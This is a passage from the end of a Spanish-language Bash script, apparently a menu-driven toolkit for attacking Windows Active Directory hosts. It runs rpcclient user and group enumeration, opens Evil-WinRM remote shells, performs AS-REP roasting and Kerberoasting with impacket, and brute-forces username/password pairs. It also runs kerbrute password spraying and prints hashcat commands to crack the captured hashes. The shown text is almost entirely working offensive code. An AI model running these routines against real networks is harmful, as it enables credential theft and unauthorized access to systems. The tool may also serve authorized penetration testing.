            rpcclient -U "$CRED_USER%$CRED_PASS" "$TARGET" -c "enumdomusers" 2>/dev/null | tee "$out"
            ;;
        2)
            log_info "Enumerando grupos del dominio..."
            rpcclient -U "$CRED_USER%$CRED_PASS" "$TARGET" -c "enumdomgroups" 2>/dev/null | tee "$out"
            ;;
        3)
            read -p "$(echo -e ${CYAN}"  [?] ¿Tipo? (group/user): "${NC})" RPC_TYPE
            read -p "$(echo -e ${CYAN}"  [?] RID (ej: 0x200): "${NC})" RPC_RID
            CMD="query${RPC_TYPE} ${RPC_RID}"
            log_info "Ejecutando: $CMD"
            rpcclient -U "$CRED_USER%$CRED_PASS" "$TARGET" -c "$CMD" 2>/dev/null | tee "$out"
            ;;
        4)
            log_info "Abriendo sesión interactiva rpcclient..."
            rpcclient -U "$CRED_USER%$CRED_PASS" "$TARGET" 2>/dev/null
            ;;
    esac

    cat "$out" >> "$REPORT_FILE" 2>/dev/null
    log_success "Completado → $out"
}

# ─── MÓDULO H: Acceso remoto Evil-WinRM ──────────────────────
modulo_winrm() {
    if ! port_open 5985 && ! port_open 5986; then
        log_warn "Puertos WinRM (5985/5986) cerrados — módulo deshabilitado"
        return
    fi
    log_section "MÓDULO — Acceso Remoto (Evil-WinRM)"
    mostrar_credenciales

    if ! check_tool evil-winrm; then
        log_error "evil-winrm no disponible — instala: sudo gem install evil-winrm"
        return
    fi

    if [ -z "$CRED_USER" ]; then
        read -p "$(echo -e ${CYAN}"  [?] Usuario: "${NC})" CRED_USER
        read -p "$(echo -e ${CYAN}"  [?] Contraseña: "${NC})" CRED_PASS
    fi

    local WINRM_PORT=5985
    port_open 5986 && WINRM_PORT=5986

    log_warn "Abriendo shell Evil-WinRM en $TARGET:$WINRM_PORT como $CRED_USER"
    log_info "Escribe 'exit' para cerrar la sesión"
    echo ""
    evil-winrm -i "$TARGET" -u "$CRED_USER" -p "$CRED_PASS" 2>/dev/null
    log_success "Sesión Evil-WinRM cerrada"
}

# ─── MÓDULO I: AS-REP Roasting ───────────────────────────────
modulo_asrep() {
    if ! port_open 88; then
        log_warn "Puerto 88 (Kerberos) cerrado — módulo deshabilitado"
        return
    fi
    log_section "MÓDULO — AS-REP Roasting"
    detectar_dominio
    pedir_diccionarios

    if ! check_tool impacket-GetNPUsers; then
        log_error "impacket-GetNPUsers no disponible"
        return
    fi

    local out="$OUTPUT_DIR/asrep.txt"
    log_info "Buscando cuentas sin preautenticación Kerberos..."
    impacket-GetNPUsers "$DOMAIN/" -dc-ip "$TARGET" \
        -no-pass -usersfile "$USERS_FILE" 2>/dev/null | tee "$out"

    if grep -q "\$krb5asrep\$" "$out"; then
        log_warn "¡Hash AS-REP obtenido!"
        grep "\$krb5asrep\$" "$out" > "$OUTPUT_DIR/hashes_asrep.txt"
        CRED_HASH=$(head -1 "$OUTPUT_DIR/hashes_asrep.txt")
        log_info "Crackear: hashcat -m 18200 $OUTPUT_DIR/hashes_asrep.txt /usr/share/wordlists/rockyou.txt"
    else
        log_success "Ninguna cuenta vulnerable ✓"
    fi
    cat "$out" >> "$REPORT_FILE"
    log_success "Completado → $out"
}

# ─── MÓDULO J: Kerberoasting ─────────────────────────────────
modulo_kerberoasting() {
    if ! port_open 88; then
        log_warn "Puerto 88 (Kerberos) cerrado — módulo deshabilitado"
        return
    fi
    log_section "MÓDULO — Kerberoasting"
    detectar_dominio
    pedir_diccionarios

    if ! check_tool impacket-GetUserSPNs; then
        log_error "impacket-GetUserSPNs no disponible"
        return
    fi

    local out="$OUTPUT_DIR/kerberoasting.txt"
    local encontrado=0

    while IFS= read -r user && [ $encontrado -eq 0 ]; do
        while IFS= read -r pass && [ $encontrado -eq 0 ]; do
            result=$(impacket-GetUserSPNs "$DOMAIN/$user:$pass" \
                -dc-ip "$TARGET" -request 2>/dev/null)
            if echo "$result" | grep -qv "invalidCredentials\|KDC_ERR\|Error"; then
                log_success "Credencial válida: $user:$pass"
                echo "$result" > "$out"
                if echo "$result" | grep -q "\$krb5tgs\$"; then
                    log_warn "¡Hash TGS obtenido!"
                    grep "\$krb5tgs\$" "$out" > "$OUTPUT_DIR/hashes_kerberoast.txt"
                    log_info "Crackear: hashcat -m 13100 $OUTPUT_DIR/hashes_kerberoast.txt /usr/share/wordlists/rockyou.txt"
                fi
                guardar_credenciales "$user" "$pass" "kerberoasting"
                encontrado=1
            fi
        done < "$PASSWORDS_FILE"
    done < "$USERS_FILE"

    [ $encontrado -eq 0 ] && log_error "No se encontraron credenciales válidas"
    cat "$out" >> "$REPORT_FILE" 2>/dev/null
    log_success "Completado → $out"
}

# ─── MÓDULO K: Password Spraying ─────────────────────────────
modulo_spray() {
    if ! port_open 88; then
        log_warn "Puerto 88 (Kerberos) cerrado — módulo deshabilitado"
        return
    fi
    log_section "MÓDULO — Password Spraying (kerbrute)"
    detectar_dominio
    pedir_diccionarios

    if ! check_tool kerbrute; then
        log_warn "kerbrute no instalado"
        log_info "Instalar: wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute && chmod +x /usr/local/bin/kerbrute"
        return
    fi

    local out="$OUTPUT_DIR/spray.txt"
    log_warn "⚠️ Lockout en 5 intentos — 1 contraseña por ronda"
    while IFS= read -r pass; do
        log_info "Probando: $pass"
        kerbrute passwordspray -d "$DOMAIN" --dc "$TARGET" "$USERS_FILE" "$pass" 2>/dev/null | tee -a "$out"
        sleep 1
    done < "$PASSWORDS_FILE"

    cat "$out" >> "$REPORT_FILE"
    log_success "Completado → $out"
}

# ─── REPORTE FINAL ───────────────────────────────────────────
reporte_final() {
    log_section "REPORTE FINAL"
    echo ""
    echo -e "${WHITE}${BOLD}  📊 Resumen — $TARGET${NC}"
    echo -e "${WHITE}  ──────────────────────────────────────────${NC}"
    echo ""

    local v=0 s=0

    verificar() {
        local nombre=$1 archivo=$2 patron=$3 malo=$4
        [ ! -f "$archivo" ] && echo -e "  ${YELLOW}[N/A]${NC}        $nombre" && return
        if grep -qE "$patron" "$archivo" 2>/dev/null; then
            [ "$malo" = "1" ] && { echo -e "  ${RED}[VULNERABLE]${NC} $nombre"; ((v++)); } \
                              || { echo -e "  ${GREEN}[SEGURO]${NC}     $nombre"; ((s++)); }
        else
            [ "$malo" = "1" ] && { echo -e "  ${GREEN}[SEGURO]${NC}     $nombre"; ((s++)); } \
                              || { echo -e "  ${RED}[VULNERABLE]${NC} $nombre"; ((v++)); }
        fi
    }

    verificar "Puertos SMB/RPC/WinRM abiertos"  "$OUTPUT_DIR/01_nmap.txt"      "445/tcp open|135/tcp open|5985/tcp open" "1"
    verificar "LDAP anónimo expuesto"            "$OUTPUT_DIR/ldap.txt"         "result: 0 Success"                       "1"
    verificar "Credenciales SMB débiles"         "$OUTPUT_DIR/smb_netexec.txt"  "\[\+\]"                                  "1"
    verificar "AS-REP Roasting"                  "$OUTPUT_DIR/asrep.txt"        "krb5asrep"                               "1"
    verificar "Kerberoasting"                    "$OUTPUT_DIR/kerberoasting.txt" "krb5tgs"                                 "1"
    verificar "Hash NTLMv2 capturado"            "$OUTPUT_DIR/hash_capturado.txt" "."                                     "1"
    verificar "Hash crackeado"                   "$OUTPUT_DIR/hashcat_resultado.txt" "."                                  "1"

    echo ""

    if [ -f "$OUTPUT_DIR/credenciales_encontradas.txt" ]; then
        echo -e "  ${GREEN}${BOLD}Credenciales descubiertas:${NC}"
        cat "$OUTPUT_DIR/credenciales_encontradas.txt" | while read l; do
            echo -e "  ${GREEN}  ✓ $l${NC}"
        done
        echo ""
    fi

    echo -e "  ${RED}${BOLD}Vulnerabilidades encontradas: $v${NC}"
    echo -e "  ${GREEN}${BOLD}Controles seguros:            $s${NC}"
    echo ""
    echo -e "${WHITE}  ──────────────────────────────────────────${NC}"
    echo -e "${GREEN}  📁 $OUTPUT_DIR${NC}"
    echo -e "${GREEN}  📄 $REPORT_FILE${NC}"
    echo ""
    echo -e "\nRESUMEN: Vulnerabilidades=$v | Seguros=$s | $(date)" >> "$REPORT_FILE"
}

# ─── MENÚ PRINCIPAL ──────────────────────────────────────────
mostrar_menu() {
    echo ""
    echo -e "${WHITE}${BOLD}  ¿Qué deseas hacer?${NC}"
    echo -e "  ${CYAN}Target: ${GREEN}$TARGET${NC}   ${CYAN}Iface: ${GREEN}$IFACE${NC}   ${CYAN}Creds: ${GREEN}${CRED_USER:-ninguna}${NC}"
    echo ""
    echo -e "${BOLD}${YELLOW}  ── Reconocimiento ───────────────────────────${NC}"

    # Nmap siempre disponible
    echo -e "  ${CYAN}[1]${NC} Escaneo de puertos ${DIM}(nmap -sV)${NC}"

    # LDAP según puerto
    if port_open 389; then
        echo -e "  ${CYAN}[2]${NC} LDAP anónimo ${DIM}(ldapsearch)${NC}"
    else
        echo -e "  ${DIM}  [2] LDAP anónimo — puerto 389 cerrado${NC}"
    fi

    echo ""
    echo -e "${BOLD}${YELLOW}  ── Captura y crackeo de credenciales ────────${NC}"
    echo -e "  ${CYAN}[3]${NC} Capturar hash NTLMv2 ${DIM}(Responder)${NC}"
    echo -e "  ${CYAN}[4]${NC} Crackear hash ${DIM}(hashcat diccionario + fuerza bruta)${NC}"

    echo ""
    echo -e "${BOLD}${YELLOW}  ── Ataques SMB ──────────────────────────────${NC}"
    if port_open 445; then
        echo -e "  ${CYAN}[5]${NC} Ataque diccionario SMB ${DIM}(netexec)${NC}"
        echo -e "  ${CYAN}[6]${NC} Enumeración SMB + privilegios ${DIM}(crackmapexec + smbmap)${NC}"
        echo -e "  ${CYAN}[7]${NC} Acceso y extracción ${DIM}(smbclient)${NC}"
    else
        echo -e "  ${DIM}  [5][6][7] SMB — puerto 445 cerrado${NC}"
    fi

    echo ""
    echo -e "${BOLD}${YELLOW}  ── Enumeración y acceso ─────────────────────${NC}"
    if port_open 135 || port_open 445; then
        echo -e "  ${CYAN}[8]${NC} Enumeración RPC ${DIM}(rpcclient usuarios/grupos)${NC}"
    else
        echo -e "  ${DIM}  [8] RPC — puertos 135/445 cerrados${NC}"
    fi
    if port_open 5985 || port_open 5986; then
        echo -e "  ${CYAN}[9]${NC} Acceso remoto ${DIM}(Evil-WinRM)${NC}"
    else
        echo -e "  ${DIM}  [9] Evil-WinRM — puertos 5985/5986 cerrados${NC}"
    fi

    echo ""
    echo -e "${BOLD}${YELLOW}  ── Kerberos ──────────────────────────────────${NC}"
    if port_open 88; then
        echo -e "  ${CYAN}[A]${NC} AS-REP Roasting ${DIM}(impacket)${NC}"
        echo -e "  ${CYAN}[B]${NC} Kerberoasting   ${DIM}(impacket)${NC}"
        echo -e "  ${CYAN}[C]${NC} Password Spraying ${DIM}(kerbrute)${NC}"
    else
        echo -e "  ${DIM}  [A][B][C] Kerberos — puerto 88 cerrado${NC}"
    fi

    echo ""
    echo -e "${BOLD}${YELLOW}  ── Otros ────────────────────────────────────${NC}"
    echo -e "  ${CYAN}[D]${NC} Ver credenciales encontradas"
    echo -e "  ${CYAN}[E]${NC} Reporte final"
    echo -e "  ${CYAN}[R]${NC} Nuevo scan ${DIM}(cambiar IP)${NC}"
    echo -e "  ${CYAN}[0]${NC} Salir"
    echo ""
}

menu() {
    while true; do
        mostrar_menu
        read -p "$(echo -e ${CYAN}"  [?] Opción: "${NC})" opcion
        echo ""

        case "${opcion^^}" in
            1) modulo_portscan; reporte_final ;;
            2) modulo_ldap ;;
            3) modulo_responder ;;
            4) modulo_hashcat ;;
            5) modulo_smb_netexec ;;
            6) modulo_smb_enum ;;
            7) modulo_smb_acceso ;;
            8) modulo_rpc ;;
            9) modulo_winrm ;;
            A) modulo_asrep ;;
            B) modulo_kerberoasting ;;
            C) modulo_spray ;;
            D) mostrar_credenciales ;;
            E) reporte_final ;;
            R)
                TARGET=""; DOMAIN=""; USERS_FILE=""; PASSWORDS_FILE=""
                CRED_USER=""; CRED_PASS=""; CRED_HASH=""
                TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
                OUTPUT_DIR=""; REPORT_FILE=""
                PORT_STATUS=()
                banner
                seleccionar_interfaz
                pedir_target
                ;;
            0)
                echo -e "${CYAN}  Saliendo...${NC}"
                [ -n "$OUTPUT_DIR" ] && echo -e "${WHITE}  Resultados en: $OUTPUT_DIR${NC}"
                echo ""
                exit 0
                ;;
            *) log_error "Opción inválida" ;;
        esac
    done
}

# ─── INICIO ──────────────────────────────────────────────────
banner
seleccionar_interfaz
pedir_target
verificar_conectividad
modulo_portscan
menu
